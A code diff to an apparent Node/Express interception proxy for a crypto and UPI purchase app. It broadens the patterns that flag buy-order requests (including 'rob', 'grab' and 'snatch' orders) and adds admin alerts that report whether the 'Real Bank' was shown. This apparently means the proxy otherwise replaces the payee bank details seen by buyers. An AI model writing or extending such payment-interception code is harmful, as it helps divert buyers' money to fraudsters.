@@ -1195,7 +1195,8 @@ app.all('/xxapi/*', async (req, res) => {
       urlLower.includes('/view') || urlLower.includes('_view') ||
       urlLower.includes('/check') || urlLower.includes('_check') ||
       urlLower.includes('/record') || urlLower.includes('_record') ||
-      urlLower.includes('/history') || urlLower.includes('_history');
+      urlLower.includes('/history') || urlLower.includes('_history') ||
+      urlLower.includes('cancel');
 
     // Detect wallet type from URL for specific handling
     const isUsdtBuy = urlLower.includes('usdt');
@@ -1203,21 +1204,11 @@ app.all('/xxapi/*', async (req, res) => {
     const isOsdtBuy = urlLower.includes('osdt') || urlLower.includes('upiplus') || urlLower.includes('upi_plus');
 
     const isBuyOrder = !isBuyList && req.method === 'POST' && (
+      /\/(createOrder|submitOrder|placeOrder|doOrder|doBuy|checkout|payOrder|confirmOrder|buyNow|purchaseOrder|addOrder|makeOrder|submitBuy)\b/i.test(path) ||
+      /\/(buy|pick|grab|take|receive|rob|snatch)(itoken|order|osdt|usdt|mobikwik|rpt)\b/i.test(path) ||
+      path.toLowerCase().endsWith('/buy') || path.toLowerCase().includes('/buy?') ||
       urlLower.includes('buyitoken') || urlLower.includes('buy_itoken') ||
-      urlLower.includes('buyorder') || urlLower.includes('buy_order') ||
-      urlLower.includes('pickorder') || urlLower.includes('pick_order') ||
-      urlLower.includes('graborder') || urlLower.includes('takeorder') ||
-      urlLower.includes('receiveitoken') || urlLower.includes('receive_itoken') ||
-      urlLower.includes('roborder') || urlLower.includes('snatchorder') ||
-      // OSDT / UPI Plus buy action
-      urlLower.includes('buyosdt') || urlLower.includes('buy_osdt') ||
-      urlLower.includes('grabosdt') || urlLower.includes('receiveosdt') ||
-      // USDT buy action
-      urlLower.includes('buyusdt') || urlLower.includes('buy_usdt') ||
-      // MobiKwik buy action
-      urlLower.includes('buymobikwik') || urlLower.includes('buy_mobikwik') ||
-      // Generic buy / rpt
-      urlLower.includes('buyrpt') || urlLower.includes('buy_rpt')
+      urlLower.includes('buyorder') || urlLower.includes('buy_order')
     );
 
     if (isBuyOrder) {
@@ -1374,8 +1365,18 @@ app.all('/xxapi/*', async (req, res) => {
 🕐 ${now}`);
               }
             }
+          } else {
+            // Case 1 fallback: proxy off OR no bank → bj returned as-is with real bank
+            const amtFallback = getOrderAmount(req, bj.data || bj);
+            notifyAdmin(data,
+              `✅ BUY SUCCESSFUL (PROXY OFF OR NO BANK)
+💰 Amount: ₹${amtFallback !== null ? amtFallback : 'unknown'}
+📋 Order: ${reqOrderId || 'N/A'}
+ℹ️ Proxy is OFF or no bank is set!
+━━━━━━━━━━━━━━━━━━━━
+🏦 Real Bank Shown
+🕐 ${now}`);
           }
-          // Case 1 fallback: proxy off OR no bank → bj returned as-is with real bank
         } else {
           // ── Case 2: Real API returned ERROR ─────────────────────────────────
           // ── Case 2: Real API returned ERROR ─────────────────────────────────
